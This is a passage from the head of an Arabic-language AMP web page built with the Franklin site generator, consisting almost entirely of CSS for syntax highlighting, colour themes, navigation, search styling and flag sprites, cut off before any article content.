<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=ar><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 